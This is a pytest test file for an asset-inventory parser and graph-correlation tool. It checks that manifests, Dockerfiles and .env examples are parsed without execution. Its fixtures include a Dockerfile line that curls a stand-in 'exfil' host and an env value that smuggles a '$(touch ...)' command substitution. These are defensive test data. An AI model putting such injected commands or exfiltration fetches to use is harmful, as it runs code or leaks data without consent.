import os

import pytest

from p004.correlation import correlate
from p004.graph import Graph
from p004.graph import diff
from p004.models import Context
from p004.parsers import dependency_manifest, dockerfile, env_example
from p004.safety import Invalid, read_bytes


def test_dependency_manifest_and_dockerfile_parse_without_execution(graph, ref):
    raw = b'[project]\nname="synthetic"\ndependencies=["pydantic==2.12.5", "PyYAML==6.0.3"]\n'
    assert dependency_manifest(graph, raw, ref, "pyproject.toml") == 2
    assert dockerfile(graph, b"FROM python:3.12-slim\nRUN curl https://example.invalid/exfil\n", ref) == 1
    assert len(graph.assets) == 2
    assert not graph.endpoints


def test_env_example_imports_names_never_values_or_expands(graph, ref, tmp_path):
    marker = tmp_path / "DO-NOT-CREATE"
    raw = f"PASSWORD=synthetic-must-not-retain\nPORT=$(touch {marker})\n".encode()
    assert env_example(graph, raw, ref, ".env.example") == 2
    assert "synthetic-must-not-retain" not in graph.snapshot().model_dump_json()
    assert not marker.exists()
    with pytest.raises(Invalid):
        env_example(graph, raw, ref, ".env")


def test_fifo_input_rejected_without_blocking(tmp_path):
    os.mkfifo(tmp_path / "pipe")
    with pytest.raises(Invalid, match="REGULAR-FILE"):
        read_bytes(tmp_path, "pipe")


def test_explicit_correlation_merges_endpoints_and_preserves_disagreements(graph, ref):
    a = graph.asset(
        "declared", "api-service", "tenant-a", ref, address="http://127.0.0.1:8764", label="declared label"
    )
    graph.endpoint(a, "/health", "GET", ref, origin="http://127.0.0.1:8764", auth="declared")
    observed = Graph(
        Context(run_id="observed-test", timestamp_utc="2026-11-15T12:01:00Z", git_commit="synthetic")
    )
    b = observed.asset(
        "observed",
        "api-service",
        "tenant-a",
        ref,
        "guarded-http",
        address="http://127.0.0.1:8764",
        status="OBSERVED",
        label="observed label",
    )
    observed.endpoint(
        b,
        "/health",
        "GET",
        ref,
        "guarded-http",
        origin="http://127.0.0.1:8764",
        status="OBSERVED",
        response_codes=[200],
    )
    combined = correlate(graph.snapshot(), observed.snapshot(), {b: a})
    assert len(combined.assets) == 1 and len(combined.endpoints) == 1
    assert combined.endpoints[0].status == "OBSERVED" and combined.endpoints[0].response_codes == [200]
    assert any(o.category == "discrepancy" for o in combined.observations)
    unmapped = correlate(graph.snapshot(), observed.snapshot())
    assert len(unmapped.assets) == 2


@pytest.mark.parametrize(
    "changes",
    [{"tenant_id": "tenant-b"}, {"address": "http://127.0.0.1:9999/"}, {"kind": "workload-identity"}],
)
def test_correlation_does_not_merge_distinct_tenants_origins_or_principals(graph, ref, changes):
    a = graph.asset("a", "api-service", "tenant-a", ref, address="http://127.0.0.1:8764")
    other = Graph(graph.context.model_copy())
    b = other.asset("b", "api-service", "tenant-a", ref, address="http://127.0.0.1:8764")
    other.assets[b] = other.assets[b].model_copy(update=changes)
    with pytest.raises(Invalid):
        correlate(graph.snapshot(), other.snapshot(), {b: a})


def test_diff_distinguishes_provenance_only_from_inventory_changes(graph, ref):
    id = graph.asset("a", "application", "tenant-a", ref)
    before = graph.snapshot()
    changed_ref = ref.model_copy(update={"sha256": "f" * 64})
    graph.assets[id] = graph.assets[id].model_copy(update={"source_refs": [changed_ref]})
    changes = diff(before, graph.snapshot())["changes"]["assets"]["changed"]
    assert changes[0]["change_type"] == "provenance-only"
    assert changes[0]["changed_fields"] == ["source_refs"]
